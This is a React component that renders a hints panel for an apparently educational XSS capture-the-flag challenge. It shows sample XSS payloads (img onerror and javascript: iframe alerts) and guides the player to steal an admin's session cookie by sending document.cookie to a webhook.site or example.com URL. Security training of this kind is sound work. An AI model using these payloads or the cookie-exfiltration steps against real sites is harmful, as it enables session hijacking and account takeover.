import {
  Card,
  CardContent,
  Typography,
  Chip,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  AccordionGroup,
} from "@mui/joy";

export default function XSSHints() {
  return (
    <Card
      variant="outlined"
      sx={{
        flex: 1,
        maxWidth: 500,
        boxShadow: "lg",
        borderRadius: "lg",
      }}
    >
      <CardContent>
        <Typography
          level="title-md"
          component="div"
          sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}
        >
          <Chip size="sm" color="warning">
            XSS Challenge
          </Chip>
          <span>Hints</span>
        </Typography>
        <AccordionGroup>
          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Discovering the Vulnerability</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                The message board renders HTML content directly.
                <br />
                <br />
                Try submitting basic HTML tags:
                <br />• <code>&lt;b&gt;bold&lt;/b&gt;</code>
                <br />• <code>&lt;i&gt;italic&lt;/i&gt;</code>
                <br />• <code>&lt;u&gt;underlined&lt;/u&gt;</code>
              </Typography>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Testing Script Execution</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                Try injecting scripts into the message board.
                <br />
                Anything happens?
                <br />
                <br />
                Alternative approaches:
                <br />• <code>&lt;img src="x" onerror="alert('XSS')"&gt;</code>
                <br />• <code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code>
              </Typography>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Information Extraction</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                First, can you find any information about the admin?
                <br />
                <strong>Techniques:</strong>
                <br />• Check for special information in source code
                <br />
                If you can't find any information, think about what the "Report this message" button
                is for.
                <br />
                <br />
                The admin may review those reported messages, how can you get their token?
              </Typography>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Data Capture</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                You can't see the review process output directly.
                <br />
                <br />
                <strong>Solution:</strong> Send data to an external server:
                <br />• Use webhook services like webhook.site to capture data
                <br />• Construct a payload that redirects the admin's browser to your webhook with
                cookie data
              </Typography>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary>
              <Typography level="title-sm">Stealing Cookies</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography level="body-sm">
                You need to capture the admin's session when they view your message.
                <br />
                <br />
                <strong>Approach:</strong>
                <br />
                • Use JavaScript to send the cookie to a server you control
                <br />• The <code>document.cookie</code> property contains all cookies for the
                current page
                <br />• The <code>document.location="https://example.com?data=xxx"</code> can
                redirect the browser to the example.com while sending data
                <br />
                <br />
                Final hint: you may find <code>&lt;script&gt;</code> tag useful here
              </Typography>
            </AccordionDetails>
          </Accordion>
        </AccordionGroup>
      </CardContent>
    </Card>
  );
}
